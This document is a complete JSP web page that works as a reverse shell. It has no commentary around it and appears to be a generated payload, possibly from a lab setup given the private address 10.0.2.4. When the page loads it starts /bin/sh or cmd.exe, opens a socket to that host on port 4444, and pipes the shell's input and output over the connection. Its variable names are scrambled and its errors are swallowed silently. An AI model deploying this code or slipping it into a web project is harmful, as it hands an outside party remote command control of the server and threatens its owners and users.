<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream hw;
    OutputStream ko;

    StreamConnector( InputStream hw, OutputStream ko )
    {
      this.hw = hw;
      this.ko = ko;
    }

    public void run()
    {
      BufferedReader qj  = null;
      BufferedWriter sqB = null;
      try
      {
        qj  = new BufferedReader( new InputStreamReader( this.hw ) );
        sqB = new BufferedWriter( new OutputStreamWriter( this.ko ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = qj.read( buffer, 0, buffer.length ) ) > 0 )
        {
          sqB.write( buffer, 0, length );
          sqB.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( qj != null )
          qj.close();
        if( sqB != null )
          sqB.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.0.2.4", 4444 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
